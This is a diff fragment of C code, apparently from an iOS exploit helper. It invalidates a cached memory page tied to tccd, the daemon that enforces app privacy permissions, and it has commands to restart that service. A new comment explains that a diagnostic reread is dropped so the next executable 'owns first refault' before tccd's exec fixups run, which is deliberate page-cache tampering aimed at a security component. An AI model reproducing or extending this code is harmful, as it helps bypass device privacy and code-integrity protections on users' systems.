@@ -31,8 +31,10 @@ static int control(int argc,char **argv){
   kern_return_t(*invalidate)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t)=(kern_return_t(*)(mach_port_t,mach_vm_address_t,mach_vm_size_t,vm_sync_t))dlsym(RTLD_DEFAULT,"mach_vm_msync");
   if(!invalidate){puts("mach_vm_msync unavailable; no invalidation");munmap(page,page_bytes);return 1;}
   kern_return_t status=invalidate(mach_task_self(),(mach_vm_address_t)page,page_bytes,VM_SYNC_INVALIDATE);
-  printf("tccd page invalidate-only kr=%d\n",status);uint32_t after=0;if(!status)memcpy(&after,(char*)page+entry_offset,4);
-  printf("tccd refaulted entry after=%#x\n",after);munmap(page,page_bytes);return status?1:0;
+  printf("tccd page invalidate-only kr=%d; next executable owns first refault\n",status);
+  /* A diagnostic reread would repopulate the vnode page under this helper's
+   * validation context before tccd's exec fixups can run. Leave it discarded. */
+  munmap(page,page_bytes);return status?1:0;
  }
  if(argc==2&&(!strcmp(argv[1],"kick-liveactivities")||!strcmp(argv[1],"kick-tccd"))){
   /* Verified shipped iOS27 libxpc service API. flags0: not suspended,
